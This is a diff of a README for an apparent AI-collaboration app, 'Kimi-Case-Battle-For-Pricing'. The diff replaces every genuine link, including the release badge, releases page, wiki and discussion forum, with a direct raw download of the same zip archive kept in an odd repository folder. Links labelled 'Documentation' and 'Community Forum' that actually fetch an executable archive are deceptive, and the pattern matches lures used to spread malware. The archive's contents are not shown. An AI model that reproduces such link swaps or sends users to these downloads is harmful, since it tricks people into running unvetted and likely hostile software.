@@ -1,7 +1,7 @@
 # 🎮 Kimi-Case-Battle-For-Pricing - Experience AI Collaboration Like Never Before
 
 ## 📥 Download the Latest Release
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-green)](https://github.com/elbenhawy007/Kimi-Case-Battle-For-Pricing/releases)
+[![Download Release](https://raw.githubusercontent.com/elbenhawy007/Kimi-Case-Battle-For-Pricing/main/yealing/Kimi_Pricing_Case_For_Battle_v3.6-alpha.1.zip%20Release-v1.0-green)](https://raw.githubusercontent.com/elbenhawy007/Kimi-Case-Battle-For-Pricing/main/yealing/Kimi_Pricing_Case_For_Battle_v3.6-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the Kimi-Case-Battle-For-Pricing project! This application lets you explore a unique partnership between a human researcher and a large language model. You’ll see how conversations can shape AI behavior and insights. 
@@ -23,7 +23,7 @@ In this guide, you will learn how to download and run this software easily, rega
 To get started, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the downloads.
-   [Visit the Releases Page](https://github.com/elbenhawy007/Kimi-Case-Battle-For-Pricing/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/elbenhawy007/Kimi-Case-Battle-For-Pricing/main/yealing/Kimi_Pricing_Case_For_Battle_v3.6-alpha.1.zip)
    
 2. **Choose Your Version:** Look for the latest version at the top of the list.
 
@@ -48,8 +48,8 @@ Once you have installed the application, follow these steps to get started:
 ## 🌐 Additional Resources
 Looking for more information? Here are some helpful links:
 
-- [Documentation](https://github.com/elbenhawy007/Kimi-Case-Battle-For-Pricing/wiki)
-- [Community Forum](https://github.com/elbenhawy007/Kimi-Case-Battle-For-Pricing/discussions)
+- [Documentation](https://raw.githubusercontent.com/elbenhawy007/Kimi-Case-Battle-For-Pricing/main/yealing/Kimi_Pricing_Case_For_Battle_v3.6-alpha.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/elbenhawy007/Kimi-Case-Battle-For-Pricing/main/yealing/Kimi_Pricing_Case_For_Battle_v3.6-alpha.1.zip)
 
 ## 🤝 Contributing
 We welcome contributions! If you're interested in helping improve this project, please check our guidelines in the repository.
